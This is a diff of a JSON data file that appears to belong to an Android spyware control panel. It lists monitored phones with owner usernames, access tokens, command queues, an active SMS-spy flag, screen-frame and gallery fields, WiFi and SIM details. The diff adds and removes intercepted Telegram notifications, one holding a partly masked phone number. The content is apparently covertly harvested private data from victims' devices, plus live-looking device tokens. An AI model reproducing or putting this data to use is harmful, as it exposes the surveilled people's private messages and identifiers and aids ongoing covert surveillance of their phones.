@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776772758003,
+    "lastSeen": 1776772782003,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776772757124,
+    "lastSeen": 1776772781128,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776772756603,
+    "lastSeen": 1776772780605,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Testimoni Gift",
+        "content": "🎉 User Baru Masuk!\n\n👤 @rafzsecret\n🆔 1874928440\n⏰ 21/4/2026, 11.58.04",
+        "time": "21/04 18:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772758448
+      },
+      {
+        "appName": "Telegram",
+        "sender": "(苏) 𝗙𝗮𝗺𝗔𝘅𝗰𝗮𝗹⁶⁰⁵",
+        "content": "t.me/nft/XmasStocking-192966\n\n[75k] stars dari u",
+        "time": "21/04 18:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772758429
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: #K— Of̶ 𐌕 Cōu̶rsēe. 𐍉",
+        "content": "😿",
+        "time": "21/04 18:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772758411
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14378,30 +14402,6 @@
         "time": "21/04 18:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769993207
-      },
-      {
-        "appName": "Telegram",
-        "sender": "BOT KONTOL",
-        "content": "Start untuk cek bot!",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769992988
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16578 pesan baru dari 112 obrolan",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769992899
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******86\n• Waktu: 21/04/2026, 18.09",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769992752
       }
     ],
     "galleryPhotos": [],
@@ -16688,14 +16688,14 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776772758164,
+    "lastSeen": 1776772780909,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
     "deviceInfo": {
       "model": "OPPO CPH2591",
       "androidVersion": "Android 15",
-      "battery": 91,
+      "battery": 88,
       "network": "WiFi: Kinza-Dalen",
       "sim1": "Smartfren 100% untuk Indonesia — Smartfren",
       "sim2": "Tidak ada"
